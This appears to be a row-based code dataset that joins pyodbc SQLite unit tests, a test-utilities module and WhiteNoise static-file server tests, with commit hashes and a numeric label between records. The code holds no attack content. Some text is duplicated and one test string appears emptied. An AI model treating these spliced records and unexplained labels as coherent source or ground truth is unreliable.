        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", default=0, action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/n/tests3/sqlitetests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a setup.cfg file in the root of the project
(the same one setup.py would use) like so:

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) // len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    STR_FENCEPOSTS = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    BYTE_FENCEPOSTS    = [ bytes(s, 'ascii') for s in STR_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = BYTE_FENCEPOSTS + [ bytes(_generate_test_string(size), 'ascii') for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, int))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value, len(value))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', '')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', value, len(value))
        return t
    for value in BYTE_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s text)"")
        self.cursor.execute(""insert into t1 values (1, 'abc')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to ""off"",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute(""begin"")
            cursor.execute(""create table t1(i int)"")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", default=0, action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/n/tests3/testutils.py/n/nimport os, sys, platform
from os.path import join, dirname, abspath, basename
import unittest

def add_to_path():
    """"""
    Prepends the build directory to the path so that newly built pyodbc libraries are used, allowing it to be tested
    without installing it.
    """"""
    # Put the build directory into the Python path so we pick up the version we just built.
    #
    # To make this cross platform, we'll search the directories until we find the .pyd file.

    import imp

    library_exts  = [ t[0] for t in imp.get_suffixes() if t[-1] == imp.C_EXTENSION ]
    library_names = [ 'pyodbc%s' % ext for ext in library_exts ]

    # Only go into directories that match our version number.

    dir_suffix = '-%s.%s' % (sys.version_info[0], sys.version_info[1])

    build = join(dirname(dirname(abspath(__file__))), 'build')

    for root, dirs, files in os.walk(build):
        for d in dirs[:]:
            if not d.endswith(dir_suffix):
                dirs.remove(d)

        for name in library_names:
            if name in files:
                sys.path.insert(0, root)
                return

    print('Did not find the pyodbc library in the build directory.  Will use an installed version.')


def print_library_info(cnxn):
    import pyodbc
    print('python:  %s' % sys.version)
    print('pyodbc:  %s %s' % (pyodbc.version, os.path.abspath(pyodbc.__file__)))
    print('odbc:    %s' % cnxn.getinfo(pyodbc.SQL_ODBC_VER))
    print('driver:  %s %s' % (cnxn.getinfo(pyodbc.SQL_DRIVER_NAME), cnxn.getinfo(pyodbc.SQL_DRIVER_VER)))
    print('         supports ODBC version %s' % cnxn.getinfo(pyodbc.SQL_DRIVER_ODBC_VER))
    print('os:      %s' % platform.system())
    print('unicode: Py_Unicode=%s SQLWCHAR=%s' % (pyodbc.UNICODE_SIZE, pyodbc.SQLWCHAR_SIZE))

    cursor = cnxn.cursor()
    for typename in ['VARCHAR', 'WVARCHAR', 'BINARY']:
        t = getattr(pyodbc, 'SQL_' + typename)
        cursor.getTypeInfo(t)
        row = cursor.fetchone()
        print('Max %s = %s' % (typename, row and row[2] or '(not supported)'))

    if platform.system() == 'Windows':
        print('         %s' % ' '.join([s for s in platform.win32_ver() if s]))



def load_tests(testclass, name, *args):
    """"""
    Returns a TestSuite for tests in `testclass`.

    name
      Optional test name if you only want to run 1 test.  If not provided all tests in `testclass` will be loaded.

    args
      Arguments for the test class constructor.  These will be passed after the test method name.
    """"""
    if name:
        if not name.startswith('test_'):
            name = 'test_%s' % name
        names = [ name ]

    else:
        names = [ method for method in dir(testclass) if method.startswith('test_') ]

    return unittest.TestSuite([ testclass(name, *args) for name in names ])


def load_setup_connection_string(section):
    """"""
    Attempts to read the default connection string from the setup.cfg file.

    If the file does not exist or if it exists but does not contain the connection string, None is returned.  If the
    file exists but cannot be parsed, an exception is raised.
    """"""
    from os.path import exists, join, dirname, splitext, basename
    from configparser import SafeConfigParser

    FILENAME = 'setup.cfg'
    KEY      = 'connection-string'

    path = join(dirname(dirname(abspath(__file__))), 'tmp', FILENAME)

    if exists(path):
        try:
            p = SafeConfigParser()
            p.read(path)
        except:
            raise SystemExit('Unable to parse %s: %s' % (path, sys.exc_info()[1]))

        if p.has_option(section, KEY):
            return p.get(section, KEY)

    return None
/n/n/n",1
116,4d8a3ab1e97d7ddb18b3fa8b4909c92bad5529c6,"tests/test_whitenoise.py/n/nimport os
import tempfile
import unittest
from unittest import TestCase
try:
    from urllib.parse import urljoin
except ImportError:
    from urlparse import urljoin
import shutil
import sys
import warnings
from wsgiref.simple_server import demo_app

from .utils import TestServer, Files

from whitenoise import WhiteNoise


# Update Py2 TestCase to support Py3 method names
if not hasattr(TestCase, 'assertRegex'):
    class Py3TestCase(TestCase):
        def assertRegex(self, *args, **kwargs):
            return self.assertRegexpMatches(*args, **kwargs)
    TestCase = Py3TestCase


class WhiteNoiseTest(TestCase):

    @classmethod
    def setUpClass(cls):
        cls.files = cls.init_files()
        cls.application = cls.init_application(root=cls.files.directory)
        cls.server = TestServer(cls.application)
        super(WhiteNoiseTest, cls).setUpClass()

    @staticmethod
    def init_files():
        return Files('assets',
                     js='subdir/javascript.js',
                     gzip='compressed.css',
                     gzipped='compressed.css.gz',
                     custom_mime='custom-mime.foobar',
                     index='with-index/index.html')

    @staticmethod
    def init_application(**kwargs):
        def custom_headers(headers, path, url):
            if url.endswith('.css'):
                headers['X-Is-Css-File'] = 'True'
        kwargs.update(max_age=1000,
                      mimetypes={'.foobar': 'application/x-foo-bar'},
                      add_headers_function=custom_headers,
                      index_file=True)
        return WhiteNoise(demo_app, **kwargs)

    def test_get_file(self):
        response = self.server.get(self.files.js_url)
        self.assertEqual(response.content, self.files.js_content)
        self.assertRegex(response.headers['Content-Type'], r'application/javascript\b')
        self.assertRegex(response.headers['Content-Type'], r'.*\bcharset=""utf-8""')

    def test_get_not_accept_gzip(self):
        response = self.server.get(self.files.gzip_url, headers={'Accept-Encoding': ''})
        self.assertEqual(response.content, self.files.gzip_content)
        self.assertEqual(response.headers.get('Content-Encoding', ''), '')
        self.assertEqual(response.headers['Vary'], 'Accept-Encoding')

    def test_get_accept_gzip(self):
        response = self.server.get(self.files.gzip_url)
        self.assertEqual(response.content, self.files.gzip_content)
        self.assertEqual(response.headers['Content-Encoding'], 'gzip')
        self.assertEqual(response.headers['Vary'], 'Accept-Encoding')

    def test_cannot_directly_request_gzipped_file(self):
        response = self.server.get(self.files.gzip_url + '.gz')
        self.assert_is_default_response(response)

    def test_not_modified_exact(self):
        response = self.server.get(self.files.js_url)
        last_mod = response.headers['Last-Modified']
        response = self.server.get(self.files.js_url, headers={'If-Modified-Since': last_mod})
        self.assertEqual(response.status_code, 304)

    def test_not_modified_future(self):
        last_mod = 'Fri, 11 Apr 2100 11:47:06 GMT'
        response = self.server.get(self.files.js_url, headers={'If-Modified-Since': last_mod})
        self.assertEqual(response.status_code, 304)

    def test_modified(self):
        last_mod = 'Fri, 11 Apr 2001 11:47:06 GMT'
        response = self.server.get(self.files.js_url, headers={'If-Modified-Since': last_mod})
        self.assertEqual(response.status_code, 200)

    def test_etag_matches(self):
        response = self.server.get(self.files.js_url)
        etag = response.headers['ETag']
        response = self.server.get(self.files.js_url, headers={'If-None-Match': etag})
        self.assertEqual(response.status_code, 304)

    def test_etag_doesnt_match(self):
        etag = '""594bd1d1-36""'
        response = self.server.get(self.files.js_url, headers={'If-None-Match': etag})
        self.assertEqual(response.status_code, 200)

    def test_etag_overrules_modified_since(self):
        """"""
        Browsers send both headers so it's important that the ETag takes precedence
        over the last modified time, so that deploy-rollbacks are handled correctly.
        """"""
        headers = {
            'If-None-Match': '""594bd1d1-36""',
            'If-Modified-Since': 'Fri, 11 Apr 2100 11:47:06 GMT',
        }
        response = self.server.get(self.files.js_url, headers=headers)
        self.assertEqual(response.status_code, 200)

    def test_max_age(self):
        response = self.server.get(self.files.js_url)
        self.assertEqual(response.headers['Cache-Control'], 'max-age=1000, public')

    def test_other_requests_passed_through(self):
        response = self.server.get('/%s/not/static' % TestServer.PREFIX)
        self.assert_is_default_response(response)

    def test_non_ascii_requests_safely_ignored(self):
        response = self.server.get(u'/{}/test\u263A'.format(TestServer.PREFIX))
        self.assert_is_default_response(response)

    def test_add_under_prefix(self):
        prefix = '/prefix'
        self.application.add_files(self.files.directory, prefix=prefix)
        response = self.server.get('/{}{}/{}'.format(TestServer.PREFIX, prefix, self.files.js_path))
        self.assertEqual(response.content, self.files.js_content)

    def test_response_has_allow_origin_header(self):
        response = self.server.get(self.files.js_url)
        self.assertEqual(response.headers.get('Access-Control-Allow-Origin'), '*')

    def test_response_has_correct_content_length_header(self):
        response = self.server.get(self.files.js_url)
        length = int(response.headers['Content-Length'])
        self.assertEqual(length, len(self.files.js_content))

    def test_gzip_response_has_correct_content_length_header(self):
        response = self.server.get(self.files.gzip_url)
        length = int(response.headers['Content-Length'])
        self.assertEqual(length, len(self.files.gzipped_content))

    def test_post_request_returns_405(self):
        response = self.server.request('post', self.files.js_url)
        self.assertEqual(response.status_code, 405)

    def test_head_request_has_no_body(self):
        response = self.server.request('head', self.files.js_url)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.content)

    def test_custom_mimetype(self):
        response = self.server.get(self.files.custom_mime_url)
        self.assertRegex(response.headers['Content-Type'], r'application/x-foo-bar\b')

    def test_custom_headers(self):
        response = self.server.get(self.files.gzip_url)
        self.assertEqual(response.headers['x-is-css-file'], 'True')

